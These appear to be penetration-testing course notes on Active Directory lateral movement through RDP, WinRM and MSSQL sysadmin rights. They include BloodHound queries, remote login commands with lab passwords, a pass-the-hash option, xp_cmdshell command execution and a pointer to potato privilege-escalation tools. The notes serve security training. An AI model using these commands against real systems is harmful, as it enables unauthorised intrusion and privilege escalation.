## Remote Access Methods Overview

Even without local admin rights, these remote access paths can provide a foothold for lateral movement:

| Method | BloodHound Edge | Use Case |
|---|---|---|
| **RDP** | `CanRDP` | GUI access; hunt for data, escalate privs |
| **WinRM / PSRemoting** | `CanPSRemote` | Remote command execution |
| **MSSQL sysadmin** | `SQLAdmin` | OS command execution via `xp_cmdshell` |

---

## 1. Remote Desktop Protocol (RDP)

### Enumerate Remote Desktop Users group
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
- If `Domain Users` is a member → every domain user can RDP to that host.

### BloodHound checks
- Node Info → **Execution Rights** → `CanRDP`
- Pre-built queries: **"Find Workstations where Domain Users can RDP"** / **"Find Servers where Domain Users can RDP"**

> **First thing to check after importing BloodHound data:** Does the Domain Users group have local admin or execution rights (RDP/WinRM) over any hosts?

### Connect via RDP
```bash
xfreerdp /v:<target_ip> /u:<user> /p:<password>
```

---

## 2. WinRM / PowerShell Remoting

### Enumerate Remote Management Users group
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### BloodHound Cypher query for WinRM access
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
Paste into the Raw Query box at the bottom of BloodHound.

### Connect from Windows (Enter-PSSession)
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

### Connect from Linux (evil-winrm)
```bash
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend
```
- Also supports `-H <NTHash>` for pass-the-hash, `-p <password>` directly, Kerberos auth, SSL, and script/executable hosting.

---

## 3. MSSQL sysadmin Access (SQLAdmin)

### Common credential sources
- Kerberoasting service accounts with MSSQL SPNs
- LLMNR/NBT-NS response spoofing
- Password spraying
- Snaffler finding `web.config` or other connection strings containing SQL credentials

### BloodHound Cypher query for SQL Admin rights
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

### Enumerate MSSQL instances (Windows — PowerUpSQL)
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

### Run a query (Windows — PowerUpSQL)
```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Connect from Linux (mssqlclient.py)
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

### Enable OS command execution and enumerate rights
```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
```

**Key finding:** MSSQL service accounts almost always have **`SeImpersonatePrivilege`** → exploitable with JuicyPotato, PrintSpoofer, or RoguePotato for SYSTEM access.

---

## Key Takeaways

- Remote access rights (RDP/WinRM) that fall short of local admin still provide a host position useful for hunting sensitive data, escalating privileges, and further enumeration.
- **Always re-enumerate after gaining control of a new user** — new rights, new group memberships, new remote access paths may appear.
- Any MSSQL credentials found (scripts, config files, connection strings) should be tested against all MSSQL servers in the environment — sysadmin access = near-guaranteed SYSTEM via `SeImpersonatePrivilege`.
- BloodHound `CanRDP`, `CanPSRemote`, and `SQLAdmin` edges + custom Cypher queries make remote access enumeration fast and comprehensive.